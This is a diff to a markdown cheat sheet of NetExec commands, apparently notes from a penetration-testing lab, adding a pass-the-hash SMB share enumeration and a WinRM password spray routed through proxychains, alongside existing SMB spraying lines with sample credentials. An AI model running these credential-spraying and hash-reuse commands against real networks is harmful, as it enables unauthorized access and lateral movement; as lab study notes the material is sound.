@@ -22,6 +22,12 @@ nxc smb -u users.txt -p 'Nexus123!' -d corp.com <DC_IP>
 nxc smb 192.168.242.0/24 -u stephanie -p 'LegmanTeamBenzoin!!' --shares
 ```
 
+#### Share Enumeration (Using PtH) - check acess to all shares
+
+```shellscript
+proxychains4 nxc smb internal-hosts.txt -H fdf36048c1cf88f5630381c5e38feb8e -u wario -d medtech.com --shares
+```
+
 #### Check for RDP Access Across a Subnet (domain creds)
 
 ```shellscript
@@ -45,3 +51,10 @@ nxc smb 192.168.201.96 -u apache -p 'New2Era4.!' --local-auth --shares
 ```shellscript
 nxc winrm 192.168.201.96 -u apache -p 'New2Era4.!'
 ```
+
+#### Spray credentials for winrm access&#x20;
+
+```shellscript
+proxychains4 nxc winrm internal-hosts.txt -u wario -p Mushroom!
+```
+
